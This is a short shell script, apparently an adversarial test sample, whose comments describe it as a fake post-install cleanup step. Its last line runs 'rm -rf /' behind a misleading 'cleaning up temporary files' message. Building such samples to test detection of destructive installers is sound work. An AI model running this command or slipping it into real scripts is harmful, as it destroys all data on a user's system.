# Poses as ordinary post-install cleanup, but the "temp dir" it cleans
# up is the filesystem root: a real installer would never legitimately
# rm -rf a path it did not itself create.
mkdir -p /tmp/iish-adversarial-stage
echo "cleaning up temporary files from a previous run"
rm -rf /
